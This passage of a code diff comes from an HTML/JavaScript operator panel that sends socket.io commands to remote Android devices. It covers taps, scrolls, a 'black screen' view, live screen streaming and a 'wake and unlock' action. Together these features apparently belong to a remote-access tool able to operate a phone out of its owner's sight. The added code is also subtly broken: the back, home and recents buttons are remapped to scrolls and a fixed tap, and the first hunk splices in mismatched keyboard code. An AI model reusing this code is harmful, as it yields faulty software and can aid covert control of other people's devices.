+                        const tapX = Math.round(element.x + element.width/2);
+                        const tapY = Math.round(element.y + element.height/2);
                         
-                        // Calculate original coordinates
-                        const tapX = Math.round(element.x + (element.width / 2));
-                        const tapY = Math.round(element.y + (element.height / 2));
-                        
+                        // पहले एलिमेंट पर टैप करें
                         socket.emit('command_to_device', { 
                             deviceId: activeDeviceId, 
                             action: 'touch_command', 
                             payload: { x: tapX, y: tapY } 
                         });
-                        
-                        // Visual feedback
-                        clickableEl.style.backgroundColor = 'rgba(0, 255, 0, 0.5)';
-                        setTimeout(() => {
-                            clickableEl.style.backgroundColor = 'rgba(0, 255, 0, 0.1)';
-                        }, 200);
-                    });
+                    };
                     
-                    liveClickableOverlay.appendChild(clickableEl);
-                }
+                    rowDiv.appendChild(keyBtn);
+                });
+                
+                keyboardButtons.appendChild(rowDiv);
             });
         }
 
-        // Event Listeners
-        btnBlackScreen.onclick = () => switchScreenView('black');
-        btnLiveScreen.onclick = () => {
-            switchScreenView('live');
-            if (!isLiveStreaming) {
-                startLiveStream();
-            }
-        };
-        btnStartStream.onclick = startLiveStream;
-        btnStopStream.onclick = stopLiveStream;
-        
-        btnFullscreen.onclick = () => {
-            const viewport = currentScreenView === 'black' ? blackViewport : liveViewport;
-            const screenArea = document.querySelector('.screen-area');
-            
-            if (!isFullscreen) {
-                // Enter fullscreen
-                viewport.style.width = '95%';
-                viewport.style.height = '95%';
-                viewport.style.maxWidth = 'none';
-                viewport.style.maxHeight = 'none';
-                btnFullscreen.textContent = '⛶';
-                isFullscreen = true;
-            } else {
-                // Exit fullscreen
-                adjustScreenSize();
-                btnFullscreen.textContent = '⬛';
-                isFullscreen = false;
-            }
-        };
-        
-        btnFitScreen.onclick = adjustScreenSize;
-
-        reconnectBtn.onclick = () => {
-            if (socket.disconnected) {
-                socket.connect();
-            }
-        };
-
-        backToListBtn.onclick = () => { 
-            stopLiveStream();
-            activeDeviceId = null; 
-            showView('device-list-view'); 
-        };
-
-        // Control buttons
-        document.getElementById('btn-back').onclick = () => {
-            if (!activeDeviceId) return;
-            socket.emit('command_to_device', { 
-                deviceId: activeDeviceId, 
-                action: 'global_action', 
-                payload: { action: 'back' } 
-            });
-        };
-        
-        document.getElementById('btn-home').onclick = () => {
-            if (!activeDeviceId) return;
-            socket.emit('command_to_device', { 
-                deviceId: activeDeviceId, 
-                action: 'global_action', 
-                payload: { action: 'home' } 
-            });
-        };
-        
-        document.getElementById('btn-recents').onclick = () => {
-            if (!activeDeviceId) return;
-            socket.emit('command_to_device', { 
-                deviceId: activeDeviceId, 
-                action: 'global_action', 
-                payload: { action: 'recents' } 
-            });
-        };
-        
-        // Scroll commands
-        document.getElementById('btn-scroll-up').onclick = () => sendScrollAction('up');
-        document.getElementById('btn-scroll-down').onclick = () => sendScrollAction('down');
-        document.getElementById('btn-scroll-left').onclick = () => sendScrollAction('left');
-        document.getElementById('btn-scroll-right').onclick = () => sendScrollAction('right');
-
+        // स्क्रॉल कमांड
         function sendScrollAction(direction) { 
             if (!activeDeviceId) return; 
             socket.emit('command_to_device', { 
@@ -1057,22 +368,61 @@
             }); 
         }
 
-        // Wake & Unlock button
+        // बैक बटन
+        backToListBtn.onclick = () => { 
+            activeDeviceId = null; 
+            showView('device-list-view'); 
+        };
+
+        // कंट्रोल बटन
+        document.getElementById('btn-back').onclick = () => {
+            if (!activeDeviceId) return;
+            socket.emit('command_to_device', { 
+                deviceId: activeDeviceId, 
+                action: 'scroll_action', 
+                payload: { direction: 'left' } 
+            });
+        };
+        document.getElementById('btn-home').onclick = () => {
+            if (!activeDeviceId) return;
+            socket.emit('command_to_device', { 
+                deviceId: activeDeviceId, 
+                action: 'touch_command', 
+                payload: { x: 100, y: 100 } 
+            });
+        };
+        document.getElementById('btn-recents').onclick = () => {
+            if (!activeDeviceId) return;
+            socket.emit('command_to_device', { 
+                deviceId: activeDeviceId, 
+                action: 'scroll_action', 
+                payload: { direction: 'right' } 
+            });
+        };
+        
+        document.getElementById('btn-scroll-up').onclick = () => sendScrollAction('up');
+        document.getElementById('btn-scroll-down').onclick = () => sendScrollAction('down');
+        document.getElementById('btn-scroll-left').onclick = () => sendScrollAction('left');
+        document.getElementById('btn-scroll-right').onclick = () => sendScrollAction('right');
+
+        // ============ मुख्य बटन: WAKE & UNLOCK ============
         wakeUnlockBtn.onclick = () => { 
             if (!activeDeviceId) {
                 alert("Please select a device first!");
                 return;
             } 
             
+            // बटन एनिमेशन
             wakeUnlockBtn.innerHTML = '⚡ PROCESSING...';
             wakeUnlockBtn.style.opacity = '0.8';
             wakeUnlockBtn.disabled = true;
             
             socket.emit('command_to_device', { 
                 deviceId: activeDeviceId, 
-                action: 'unlock_device'
+                action: 'wake_and_unlock'
             });
             
+            // 3 सेकंड बाद बटन रीसेट
             setTimeout(() => {
                 wakeUnlockBtn.innerHTML = '⚡ WAKE & UNLOCK';
                 wakeUnlockBtn.style.opacity = '1';
@@ -1080,30 +430,10 @@
             }, 3000);
         };
 
-        // Resize handler
-        window.addEventListener('resize', adjustScreenSize);
-        
-        // Auto-adjust on view change
-        document.addEventListener('visibilitychange', () => {
-            if (!document.hidden) {
-                setTimeout(adjustScreenSize, 100);
-            }
-        });
-
-        // Heartbeat
+        // हार्टबीट
         setInterval(() => { 
             if (socket.connected) socket.emit('heartbeat', {}); 
         }, 30000);
-        
-        // Auto-start live stream when device is selected
-        setInterval(() => {
-            if (activeDeviceId && currentScreenView === 'live' && !isLiveStreaming && isConnectionStable) {
-                startLiveStream();
-            }
-        }, 5000);
-        
-        // Initial connection status
-        updateConnectionStatus(socket.connected);
     </script>
 </body>
 </html>
